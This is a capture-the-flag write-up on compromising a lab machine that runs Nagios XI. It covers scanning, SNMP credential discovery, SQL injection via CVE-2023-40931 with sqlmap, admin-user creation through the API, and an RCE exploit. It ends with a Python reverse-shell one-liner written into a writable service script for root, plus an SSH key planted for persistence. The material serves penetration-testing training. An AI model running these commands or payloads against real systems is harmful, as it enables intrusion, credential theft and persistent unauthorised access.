### Initial Recon and Port Scanning

I began by conducting a thorough Nmap scan to identify any open ports on both TCP and UDP.

```
sudo nmap 10.10.11.248 -T4 -sV -p- -v
```

```
sudo nmap 10.10.11.248 -T4 -sV -v -sU --top-ports 100
```

The initial scan revealed ports 80 and 443. However, the webpage on port 80 seems to be a simple redirect to the page on 443. For now, I'll focus my attention on the secure port. My first task was subdomain and directory enumeration.

```
ffuf -u https://monitored.htb -H 'Host: FUZZ.monitored.htb' -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_medium.txt -fc 302 -fs 3245 
```

The subdomain search turned up `nagios`. Nagios is a company that maintains a suite of network monitoring software. This seems like a good route to go down, so I started fuzzing the subdomain.

```
ffuf -u https://nagios.monitored.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The directory fuzzing points us to Nagios XI, a particular open source product of Nagios meant for network event monitoring. The directory structure of this product is known, but just to be safe, I went ahead and fuzzed it. 

```
ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 468 -recursion -e ".php,.txt" | tee nagiosXIRecursive.txt
```

I found a login page for an admin panel, and attempted a brute force attack. 

```
ffuf -request brutelogin.txt -w /media/sf_Share/rockyou.txt -fs 26817
```

Unfortunately I was unable to gain access.

### LDAP and SNMP Enumeration

The initial scan revealed LDAP running on port 389, so I launched a more targeted scan using Nmap scripts to extract as much information as possible from the LDAP service.

```
sudo nmap 10.10.11.248 -T4 -p389 -sV -v --script=ldap-rootdse,ldap-search
```

Unfortunately, I didn't get any new information from the Nmap scripts. I decided to try LDAPsearch instead, just to be safe. 

```
ldapsearch -H ldap://monitored.htb:389/ -x -s base -b '' "(objectClass=*)" "*" + 
```

```
ldapsearch -H ldap://monitored.htb:389/ -x -s base -b 'dc=monitored,dc=htb' "(objectClass=*)" "*" +
```

While this didn’t return anything particularly useful, my UDP scan uncovered SNMP on port 161, so I pivoted to using snmpwalk to enumerate possible information from SNMP.

```
snmpwalk -v2c -c public 10.10.11.248
```

Here, I found an interesting entry related to a user and potential password.

```
-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7V.............
```

I then used onesixtyone to brute force any other community strings that might be present, but this user/password pair was enough to proceed.

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.248
```

### API Key Discovery and Nagios Enumeration

NagiosXI has a a fair number of CVE's but I don't know the version of the application yet. Furthermore, most of the vulnerabilities I've found require an authenticated user, and the credentials I found earlier don't seem to work for any of the login pages. 

While taking a breather, I looked back at my recurisve ffuf scan. The directory `/nagiosxi/api/v1/` contains a ton of information, but most of it is is 32 bytes long.  Out of curiosity, I looked in the browser to see what was happening. The browser returned a simple API error. "No API Key provided." I filtered out these errors in ffuf to see if there were any other messages from the API.

```
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 32 
```

I discovered the following message when sending a request to `/api/v1/authenticate`: "You can only use POST with authenticate."

This is a documented form of interaction with the Nagios API, and after a digging through some forum posts I found this command for authenticating to the server and gaining an auth token:

```
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7V..........&valid_min=120'
```

This gave me a token (e.g., `e91ef72bc6d1e00c8432adeb8242dab064ae102f`). I now had authenticated access, which was crucial for exploiting [CVE-2023-40931](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567), a SQL injection vulnerability in Nagios XI. The vulnerability specifically targets the Banner acknowledging endpoint. When users acknowledge a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with these parameters either following the URI or in the Data field: `action=acknowledge_banner_message` and `id=3`. The vulnerability here is that the ID field is assumed to be trusted despite coming directly from the client without sanitization.

Placing `&token=<token>` after the ID field allows me to use my token for authentication. Unfortunately, the token I received earlier is one time use only. I won't be able to use automated tools for the SQL injection. 

```
curl -X POST "http://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" -d "action=acknowledge_banner_message&id=3&token=e91ef72bc6d1e00c8.................."
```

```
Set-Cookie: nagiosxi=17ff00phbve1cri86ni4dgnn2m; expires=Fri, 26-Apr-2024 03:21:58 GMT; Max-Age=1800; path=/; secure; HttpOnly
```

To my delight, the response I received back contained a semi persistent cookie! After some testing, I find that it allows me to authenticate to `nagios.monitored.htb/nagiosxi` without a password. This is great because it means I can leverage sqlmap for the SQL injections. From my research I know that Nagios XI uses MariaDB, which is a fork of MySQL. I also know the prefix for the sql database is `xi_` due to documentation and forum posts. With these two pieces of information, I crafted a command to dump the user table. 

```
sqlmap -u https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php --data 'action=acknowledge_banner_message&id=3' --cookie 'nagiosxi=dg4f2gmil0qr7qigcrbdbe7sfe' -p id --risk 3 --level 5 --dbms=MySQL -T xi_users --dump
```

The dump revealed the admin credentials:

```
 admin@monitored.htb
 APIKey:IudGPHd9pEKiee................................
 Password: $2a$10$825c1eec2.............................
 BackendTicket:IoAaeXNL......................
```

I'm curious to see if I can crack the password, so I load the hash into hashcat.

```
hashcat "Z:\HTB\VirtualBox VMs\Kali\Share\hashes.txt" -m 3200 --opencl-device-types=1,2 Z:\HTB\Wordlists\rockyou.txt -r rules/best64.rule 
```

Unfortunately, the hash didn't crack. From here I focused on the API key and the backend ticket. 

### Creating a Nagios Admin User

While researching, I found [a script on exploit-db](https://www.exploit-db.com/exploits/51925) that was meant to streamline the SQL injection. I was already past that point, but while reading through it I noticed that it contained a ton of useful information about the API. I also found[ a forum post](https://support.nagios.com/forum/viewtopic.php?t=42923) that described how to add a user to Nagios XI. It didn't mention how to make an admin user, but after reviewing the exploit-db script, I knew that simply adding auth_level=admin would grant admin permissions. 

```
curl -X POST "http://10.10.11.248/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=test&password=test&name=test&email=t@monitored.htb&auth_level=admin" 
```

I had successfully created a new admin user, but it didn't turn out to be all that useful. 

### Nagios API RCE

From here I looked further into the script I had found earlier. At first I had thought it was only meant to streamline the SQL injection, but I found that it had actually combined two exploits into one. It performed the SQL injection, yes, but it also contained an RCE exploit. By editing the exploit to use the API key I had already obtained instead of dynamically generating it with sqlmap, I successfully triggered a reverse shell.

```
python3 ./payload.py nagios.monitored.htb 10.10.14.18 4444 
```

For good measure and persistence, I added my SSH public key to the server.

```
ssh-keygen 
```

```
cat ~/.ssh/id_ed25519.pub
```

```
cd /home/nagios/.ssh
```

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH5ErsH9G1kMulsYKPZMgc6nazSps2cagp3C6mvcTDUQ kali@kali" > authorized_keys 
```

### Privilege Escalation: manage_services.sh

Now that I finally had a shell, I checked my sudo permissions.

```
sudo -l
```

It seems as though I have plenty of options to choose from, but the permission that stuck out to me most was for a script called manage_services.sh. I first went to the directory to see if I had write permissions on the script directly, but no dice. Regardless, I needed to know what the script actually did.

```
cat /usr/local/nagiosxi/scripts/manage_services.sh
```

As it turns out, the script is for... managing services. Who would've thought? But that actually works out great for me.

`Things you can do    
`first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable") 
`second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm") `

My first instinct was to check out "shellinaboxd." It had been sticking out to me since the start of this box when I saw it in my fuzzing. 

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh status shellinaboxd
```

`Loaded: loaded (/etc/init.d/shellinabox; generated) `

It gave me a directory. When I went to that directory, I found that most of the services listed in the script are in there with it. Unfortunately, I have write access to none of them. However, there are two that aren't listed in the `init.d` directory; `npcd` and `nbo2db`. That's not super interesting on it's own, but it is pretty interesting that I have write permissions on `npcd`! To make things even more interesting, I have access to `vi` on this box. I deleted the old script, and made a new one containing a python reverse shell.

```
vi npcd
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

I then made the file executable:

```
chmod +x npcd
```

Started a listener:

```
nc -nvlp 4444
```

"Stopped" the process that was previously running:

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
```

and finally, started the new and improved npcd:

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```

Now that I had root access, I claimed my flag and finished the box. This box required a multi-faceted approach involving fuzzing, SNMP enumeration, API exploitation, and privilege escalation via writable service scripts. Understanding how each service interacted with the system was crucial in chaining the exploits together for root access. Overall I think this was one of my favorite boxes, and I hope to see more like it soon!